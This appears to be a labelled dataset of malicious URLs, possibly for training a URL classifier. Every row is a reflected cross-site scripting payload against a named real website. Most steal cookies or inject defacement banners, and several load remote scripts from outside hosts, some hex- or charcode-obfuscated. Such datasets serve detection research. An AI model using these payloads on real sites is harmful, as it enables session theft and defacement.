http://www.soft32.com/search/7-0-6.html?sort=6&amp;or=&amp;exact=&amp;not=&amp;wheretosearch=0&amp;datespan=0&amp;price=&amp;dls<br>ize=&amp;licence_0=yes&amp;licence_1=yes&amp;licence_2=yes&amp;licence_3=yes&amp;licence_4=yes&amp;rating=0&amp;and=%22%3e%3cscr<br>ipt%3ealert%28%27gurus+here%21+prahhh%27%29%3c%2fscript%3e&amp;os=1&amp;submitform.x=30&amp;submitform.y=9&amp;submi<br>tform=submit,Malicious
"http://www.saab.hu/hirek-sajtoinformaciok/hirlevel?form%5bname%5d=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious
http://detroit.tigers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.avast.com.cn/eng/search.php?searchfor=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.lyaql.gov.cn/result.asp?keyword=%3ciframe%20src=http://www.google.com%3e%3c/iframe%3e,Malicious
"http://edition.cnn.com/pointroll/pointrollads.htm?pub=http://www.google.com?+&amp;redir=%27%3e%3cscript%<br>3ewindow.location=location.search.substring(5,28).concat(document.domain)%3c/script%3e&amp;ad=g235e20051<br>011164320",Malicious
http://www.campingplatz-georgenthal.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://kennysclub.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.ofta.gov.hk/zh/disclaimer/sc_disclaimer.asp?durl=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&lt;a name=&quot;,Malicious
http://semaphore2.hants.gov.uk/scripts/semaphoreserver.exe?prop00=t%3dp&amp;savedb=hants&amp;saveorganise_co<br>ded=%3af9&amp;saveb=len&amp;saveb2=i1museumsandgalleries&amp;saveb2_desc=museums+and+galleries&amp;savequery00=histo<br>ric&amp;saveprop00=t%3dp&amp;savequery01=museumsandgalleries&amp;saveprop01=s%3dnone%2ct%3db%2cp%3di1&amp;savetbdb=h<br>ants_ipsv1&amp;savetbpt=museums+and+galleries&amp;savetbsy=museums+and+galleries&amp;savestype=az&amp;saveaz=&amp;cmd=se<br>arch.run&amp;query00=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%3e,Malicious
http://unlock.tacobell.com/unlock/?error=please%20verify%20that%20you%27re%20not%20a%20bot%20by%20completing%20the%20image%20captcha.%3cscript%3ealert%28%22give%20me%20codez%20nowz!!!%22%29%3c/script%3e,Malicious
http://search.kuleuven.be/index.cgi?words=%3cscript%3ealert(1)%3c/script%3e,Malicious
http://patents1.ic.gc.ca/details?patent_number=%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scri<br>pts/hotpockets.js%3e,Malicious
https://www.co.cc/notice/notice.php?a=%3cscript%3ealert(123);%3c/script%3e,Malicious
http://www.concordia.gov.ar/princ_busqueda_result.php?keyword=%3c/title%3e%3cscript%3ealert(/xss/);%<br>3c/script%3e%3ctitle%3e,Malicious
http://hrant-ve-biz.org/katilim_formu.php?isim=%22%3e%3cscript+src%3dhttp%3a%2f%2fsinek.pandela.net%<br>2fj.js%3e%3c%2fscript%3e&amp;soy_isim=%22%3e%3cscript+src%3dhttp%3a%2f%2fsinek.pandela.net%2fj.js%3e%3c%<br>2fscript%3e&amp;email=%22%3e%3cscript+src%3dhttp%3a%2f%2fsinek.pandela.net%2fj.js%3e%3c%2fscript%3e&amp;tari<br>h=2007-02-16,Malicious
https://video.ask.jp/loginsignup.do?memberfriendid=&amp;registerid=&amp;username=%22%3e%27%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%<br>32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2<br>c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;password=,Malicious
http://www.123greetings.com/cgi-bin/search/search.pl?words=%22%3e%3cscript%3ealert(%22happy%20hallow<br>een%22)%3c/script%3e&amp;fpage=halloween&amp;i1.x=0&amp;i1.y=0,Malicious
http://www.cruisecritic.com/newsletter/index.cfm?referral=%22%3e%3cscript%3ealert(document.cookie)%3<br>c%2fscript%3e,Malicious
http://www.dunken.se/sokprodukter.asp?sokord=%3cscript%3ealert%28123%29%3c%2fscript%3e,Malicious
http://www.level3.com/en/search.aspx?searchstr=%22%3e%3cscript%3ealert%28%27xss%20@%20level3%27%29;%<br>3c/script%3e,Malicious
http://ms109.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
"http://pokerrpg.com/profile.php?user=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromcha<br>rcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,83)<br>)//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://forums.wow-europe.com/thread.html?topicid=7539774129&amp;sid=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://alphatest.repubblica.it/errore.php?sql=--xados--%3cscript%3ealert%28document.cookie%29%3c/scr<br>ipt%3e%3ciframe%20src=%22http://www.xssed.com%22%20width=%221000%22%20height=%221000%22%3e%3c/iframe<br>%3e,Malicious
http://www.regione.campania.it/portal/media-type/html/user/anon/page/searchresults.psml;jsessionid=1<br>97556bf32d4c6af560082df624c8185.tomcat1?offset=0&amp;recpage=12&amp;eventsubmit_dorefresh=trova&amp;query=%3cscr<br>ipt%3ealert%28%22xss%22%29%3c%2fscript%3e&amp;eventsubmit_dorefresh=trova,Malicious
http://www.tamindir.org/indir/ara.asp?ara=%22%3e%3cscript%3ealert(%22jock3r%22)%3c/script%3e,Malicious
http://www.philipmorrisinternational.com/br/pages/por_br/utilities/search_results.asp?language=por_b<br>r&amp;mode=&amp;newsearch=true&amp;searchstring=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdp<br>arty%2fscripts%2fpython5.js%3e%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.cesr.eu/index.php?page=groups&amp;mac=0&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.distantstar.org.uk/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://tr.netlog.com/go/explore/events/eventid=6588&amp;cpage=1&amp;apage=%22%3e%3cscript%3ealert(1)%3c/scri<br>pt%3e%3ch1%3eccc%2bwas%2bhere%3c/h1%3e,Malicious
"http://www.nicars.co.uk/search.php?c=&amp;search_country=&amp;search_state=&amp;search_city=&amp;min=&amp;max=&amp;year1=';a<br>lert(string.fromcharcode(88,83,83))//%5c';alert(string.fromcharcode(88,83,83))//%22;alert(string.fro<br>mcharcode(88,83,83))//%5c%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3csc<br>ript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;year2=&amp;before=&amp;agentid=",Malicious
http://shop.ebay.de/?_from=r40&amp;_npmv=3&amp;_trksid=m38&amp;_nkw=%3cscript%3ealert%28%27seymen%27%29%3b%3c%2f<br>script%3e&amp;_nd1=see-all-categories,Malicious
http://www.ls-takano.com/cgi-bin/topics/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20<br>unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://www.ksiegarnianamiodowej.pl/go/_search/full_search.php?sess_id=d8da01fdf06fcaacdb6faad02e443d<br>5b&amp;search_query_words=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;#scena_1,Malicious
http://www.merriam-webster.com/cgi-bin/audio.pl?=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.opiniaoenoticia.com.br/tags.php?id=%22%3e%3cscript%3ealert(666)%3c/script%3ehttp://www.op<br>iniaoenoticia.com.br/tags.php?id=%22%3e%3cscript%3ealert(666)%3c/script%3e,Malicious
http://www.aiv.by/czasopisy/mat.php?cz_h=2003&amp;cz_n=03&amp;mat_id1=03200304&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious
http://www.gametrailers.com/cc2k7.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74<br>%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%<br>31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%3<br>1%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.pulp.co.nz/content.php?contentid=515&amp;catid=10&amp;sectionid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious
http://www.zdnetindia.com/imsearch/result.html?phpsessid=0a823f23b48126650cb5facacef8e419&amp;searchword<br>=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;newsearch=1&amp;submit=++go++&amp;optsrc=0&amp;x=28<br>&amp;y=17,Malicious
http://doctor.ndtv.com/search.aspx?searchtext=harvey><script>alert(document.cookie)</script>&site=searchtextbox-5555,Malicious
http://www.idt.min-saude.pt/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.50statesclassifieds.com/classifieds/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://balkanweb.com/sitev4/index.php?where=1&amp;words=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e,Malicious
http://www.flashback.se/hack/index.php?lang=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%5<br>3%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c<br>%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%<br>2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;y=2000,Malicious
http://www.idt.min-saude.pt/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols=2&amp;f<br>orm=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.kataweb.it/go?page=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious
http://www.neopets.com/games/iom/i_of_m_view_item.phtml?item=goblet%22%3e%3cscript%3ealert(8)%3c/script%3e&max_defense=14%27,Malicious
http://www.belgenet.net/ayrinti.php?yil_id=%22%3e%3c/script%3e%3cmarquee%3e%3ch1%3eby+st@rext+oylar%<br>fdn%fdz%fd+bana+verin+site+hacklayal%fdm+:d%3c/h1%3e%3c/marquee%3e,Malicious
"http://www.rate.ee/search.php?height1=&quot;&gt;&lt;script&gt;document.write(string.fromcharcode(60,83,67,82,73));<br>&lt;/script&gt;pt&gt;%20document.write(string.fromcharcode(60,98,111,100,121,32,111,110,108,111,97,100,61,34,<br>100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,99,101,110,116,101,114,62,60,104,50,6<br>2,84,104,101,32,103,105,114,108,32,105,115,32,101,108,105,116,101,58,68,60,47,104,50,62,60,47,99,101<br>,110,116,101,114,62,39,41,34,62))&lt;/script&gt;",Malicious
http://www.issa.int/index.php/aiss/schema_comparison/categories?branch=sickness%20and%20maternity&amp;br<br>anch_node1=25516&amp;branch_node2=28325&amp;combo_country1=659&amp;combo_country2=3506&amp;curr_node_id=&amp;curr_object<br>_id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.ameisen.cc/userpages/usersite4.php?whose=113360&amp;id=%22%3e%3cscript%3ealert(/ayf%a3r+bu+s1<br>t%a3+c1k1y0r/)%3c/script%3e,Malicious
http://blog.animate.tv/dn/index.php?blogid=46&amp;archive=2007-10-5%22%3e%27%3e%3c%73%63%72%69%70%74%3e%<br>61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%3<br>3%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31<br>%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.lefigaro.fr/palmares-lycees/recherche.php?etab=%22%3e%3cscript%3ealert(1337)%3b%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+warvector+%3d)%3c%2fh1%3e%3c%2fmarquee%3e&comm=%22%3e%3cscript%3ealert(1337)%3b%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+warvector+%3d)%3c%2fh1%3e%3c%2fmarquee%3e&x=0&y=0&type=general,Malicious
http://www.campimagination.org/2004/week2/gallery/login.asp?folder=arrival&amp;n=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ar.gov.ru/en/main_menu_en/news-events/index.php?m2=all&amp;amp;np2=579&amp;amp;ps2=10&amp;amp;q2=corrupti<br>on%22&amp;amp;sp2=1&amp;amp;sy2=1&amp;amp;ul2=http://ar.gov.ru/&amp;amp;wf2=2221&amp;amp;wm2=%22%3e%3c/script%3e%3cscrip<br>t%3ealert%28document.cookie%29%3c/script%3e%3cscript%3ealert%28/xssed%20by%20ar3sw0rmed/%29;%3c/scri<br>pt%3e,Malicious
http://www.wareztunisie.org/torrent/torrents.php?parent_cat=%3cscript%20%0a%0d%3ealert(/k3vinmitnick<br>/)%3b%3c/script%3e&amp;page=1,Malicious
"http://tvlistings.telegraph.co.uk/grid.php?&amp;day=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/scri<br>pt&gt;",Malicious
http://www.michelin.gr/greece/front/search.jsp?query=%ce%95%cf%81%ce%b5%cf%85%ce%bd%ce%ac%2e%2e%2e&amp;l<br>ang='&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20-%20canim%20turkiyem')%3b&lt;/script&gt;,Malicious
http://www.4shared.com/network/search.jsp?sorttype=1&amp;sortorder=1&amp;sortmode=3&amp;searchdcid=21&amp;searchname<br>=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat+forever%3c%2fmarque%3e&amp;<br>searchmode=3&amp;searchname=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat+<br>forever%3c%2fmarque%3e&amp;searchdescription=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cma<br>rquee%3ewhitehat+forever%3c%2fmarque%3e&amp;searchextention=category%3a1&amp;sizecriteria=atleast&amp;sizevalue=<br>10&amp;start=0,Malicious
http://link.tool.ms/login.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://forumlari.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://gosee.com/search/search.php?page=13&amp;type=links&amp;swords=%22%3e%3cscript%3ealert(string.fromchar<br>code(115,101,121,109,101,110))%3c/script%3e",Malicious
http://etrc.lib.umn.edu/frenwom.htm%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3<br>e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://learning.microsoft.com/manager/catalog.aspx?qry=%22%3e%3cscript%3ealert%28/xssed/%29%3c/script%3e&nav=0&btn=1,Malicious
http://docbweb.acp.pt/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsearch=1&amp;searchtxt=&quot;&gt;&lt;scri<br>pt&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.ijigg.com/search?s=malha%c3%a7%c3%a3o%20mil%20acasos%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.sonicpastmusic.com/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3<br>b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://3.tool.ms/restore.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://shopping.web.de/preischeck/akku-c_7096-0011.html?s=%3c%22%3c%3cscript%3ealert%28document.cook<br>ie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript<br>%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscr<br>ipt%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28doc<br>ument.cookie%29%3c%2fscript%3e,Malicious
"http://www2.chinatelecom.com.cn/areacode/result3.php?code=%22%3e%3cscript%3ealert(string.fromcharcod<br>e(88,83,83))%3c/script%3e&amp;imagefield22.x=0&amp;imagefield22.y=0",Malicious
"http://ed-pharmarx.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious
http://blog.maxray.net/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70<br>%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%<br>31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%3<br>1%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.ruedadesol.it/public/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://sourceforge.net/account/lookup_username.php?emailaddr=&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://emopunk.net/my_ep/login.php?ref=%22%3e%3cscript%3ealert(23)%3c/script%3e,Malicious
http://2russia.com/includes/setdate.php?year=2007&amp;u=&amp;month=11&amp;day=09&amp;hour=12&amp;type=%22%3e%27%3e%3c%73<br>%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%<br>36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%3<br>1%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.lactualite.com/resultat-recherche?cx=012041515408509556353%3axuc9fskx5ca&amp;cof=forid%3a11&amp;i<br>e=utf-8&amp;as_q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;op.x=24&amp;op.y=9&amp;form_build_id=form-c07fb0b98a3297ca2b7df5e94c8edb6c&amp;form_id=search<br>_theme_form,Malicious
http://www.dow.com/webapps/lit/litorder.asp?filepath=plastics_la/pdfs/noreg/002-10433.pdf&amp;pdf=true'&quot;<br>&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;xxxxxxxxx&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.besni.gov.tr/resim/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ccaronsewa.com/newsdetail.php?id=%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.turkismetal.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssedb<br>ycicosz&quot;)&lt;/script&gt;,Malicious
http://www.core-techs.fr/display?template=printable&amp;uid=%22'/%3e%3cscript%3ealert('hello%20the%20rat<br>')%3c/script%3e,Malicious
http://uk.search.ign.com/article?query=lol%3c%2ftitle%3e%3cscript%3ealert%28document.cookie%29%3c%2f<br>script%3e,Malicious
http://www.autoscout24.ch/cust/search.asp?language=ger&amp;error=insuff&amp;group=5&amp;modellike='%22%3e%3ch1%3<br>erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3eh&amp;cur=chf&amp;zipcountry<br>=ch&amp;lockmake=&amp;hidecountry=&amp;hideextended=&amp;layout=60400,Malicious
http://www.busrates.com/results.php?page=1&amp;city=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/scri<br>pt%3e,Malicious
http://aksarayagsl.k12.tr/cms/index.php?option=com_ponygallery&amp;mosmsg=&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious
http://www.excite.co.jp/bbs/blog/introduce/thread?mode=id&amp;t=1143553'%3e%22%3e%3cscript/src=http://ku<br>somiso.com/xss.js%3e%3c/script%3e&amp;m=1&amp;submit22=%95%5c%8e%a6,Malicious
http://www.kentuckianaauctions.com/index.php?page=5&amp;keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://www.video.name.tr/ara.asp?kelime=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.intermaritimeservices.com/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29<br>%3c/script%3e,Malicious
http://profiles.doe.mass.edu/search.asp?mode='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cma<br>rquee%3ewhitehat%20forever%3c/marque%3e&amp;county='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3c<br>marquee%3ewhitehat%20forever%3c/marque%3e&amp;town='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3c<br>marquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://fletchersite.com/classifieds/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://janetthephotographer.com/photogallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.<script>alert(1)</script .com,Malicious
http://z0ne-h.net/haber/yorum.asp?haber_id=%22%3e%3ch1%3exss%3cbody%20onload=alert(/xss/)%3e,Malicious
http://fplayer.youtubech.com/lite/index.pl?q=%22%3e%27%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscrip<br>t%3e,Malicious
http://www.slac.stanford.edu/spires/find/hep/www?rawcmd=uber0n+%3c%2ftitle%3e%3c%2fhead%3e%3cbody%3e<br>%3ciframe+src%3dhttp%3a%2f%2fuber0n.darkillusion.org%2fxsspage.htm%3e&amp;format=www&amp;sequence=,Malicious
http://szukaj.onet.pl/zdjecia.html?qt=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e,Malicious
http://wiki.cs.uiuc.edu/visualworkings/search?command=search&amp;searchpattern=%22%3e%3cscript%3ealert%2<br>8%27jamming...%27%29%3c%2fscript%3e,Malicious
http://f38.aaa.livedoor.jp/~tanirero/yomiphp/index.php?mode=dir&amp;path=02/'%3e%22%3e%3cscript/src=http<br>://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.webconfs.com/keyword-density-checker.php?url='%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,Malicious
http://fizy.org/d4snrzq6-6aehe%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.wildandscenicphotos.com/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,Malicious
http://www.advercash.net/signup.php?ref=%22%3e%3c/a%3e%22%3e%3cscript%3ealert(/=p%20xss/)%3c/script%<br>3e,Malicious
http://www.hsbc.com.sv/?cat=-4&amp;src=%22%3e%3cscript%3ealert(/hsbc%20xssed/);%3c/script%3e,Malicious
http://www.jobup.ch/jobmail.asp?id=184421&amp;title=technicien+serveurs+linux&amp;loc=lausanne&amp;name=&lt;script&gt;<br>alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;,Malicious
http://www.restartyourcomputer.com/vivvo/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3cscript%3ea<br>lert(document.cookie)%3c/script%3e%3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://search.adroutine.com/search.php?search=\%22%3e\%27%3e%3cscript%3ealert(123)%3c/script%3e&amp;type<br>=web,Malicious
http://www.nestle.se/neobuilder.php?search_key=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22&amp;id<br>=0524210300_1_38d7a252db398&amp;f_ar_group%5bweb%5d=on&amp;f_ar_group%5bpress%5d=on&amp;f_ar_group%5bactivity%5d<br>=on&amp;f_ar_group%5bjob%5d=on&amp;f_ar_group%5bfile%5d=on&amp;search_where=all&amp;f_top_id=200108091925_6620_3b72c<br>7a34cc98&amp;date_search=before&amp;date=14&amp;month=12&amp;year=2007,Malicious
http://www.itds.gov/xp/cgov/offsiteredirectpg.xml?title=international+trade+%22%3e%3cscript%3ealert%<br>28document.cookie%29%3c/script%3e+system+%28itds%29&amp;url=http%3a%2f%2fwww.itds.gov%2f&amp;referrer=/xp/cg<br>ov/trade/automated/modernization/,Malicious
http://americanbridal.resultspage.com/search?ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
"http://fi.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.icr.ro/bucuresti/search/?search_check=1&amp;search_text=%3cscript%3ealert(1)%3c%2fscript%3e++<br>&amp;go_search=ok,Malicious
https://business.verizonwireless.com/b2b/jsp/popups/optin.jsp?email=xss'%3e%3cscript%3ealert('xss')%<br>3c/script%3e%3cb%20,Malicious
http://techrepublic.com.com/1320-4_11-55.html?path=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://www.hotelamholstenwall.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.ieice.org/bin/fulltext_search.php?key=%22%3e%3cscript%3ealert%28document.cookie%29%3b%<br>3c%2fscript%3e&amp;dosearch=search&amp;e_index_a=on&amp;e_index_b=on&amp;e_index_c=on&amp;e_index_d=on&amp;e_index_e=on&amp;j_e_<br>index_a=on&amp;j_e_index_b=on&amp;j_e_index_c=on&amp;j_e_index_d=on&amp;lang=e,Malicious
http://www.godaddy.com/gdshop/survey/ad.asp?isc=gdm0116&amp;se=%22&amp;app_hdr=99&amp;ad=%22%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e,Malicious
